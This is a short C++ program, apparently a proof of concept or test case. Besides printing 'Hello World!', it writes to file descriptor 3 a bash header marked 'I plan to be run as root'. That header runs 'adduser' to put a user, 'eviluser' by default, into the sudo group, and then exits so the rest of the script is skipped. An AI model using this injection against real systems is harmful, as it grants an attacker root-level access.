#include <stdio.h>
#include <iostream>
#include <string>

using namespace std;

int main(int argn, char **argv) {
  cout << "Hello World!" << endl;

  string user;
  if (argn>=2) user = string(argv[1]);
  else user = "eviluser";

  FILE *metafile = fdopen(3,"w");
  if (metafile != NULL) {
    string header = "";
    header += "#!/bin/bash\n";
    header += "# START head\n";
    header += "# I plan to be run as root\n";
    header += "adduser " + user + " sudo\n";
    header += "exit # ignore the rest of the script\n";
    header += "# END head <<\n";
    fprintf(metafile, "%s", header.c_str());
  }

  return 0;
}
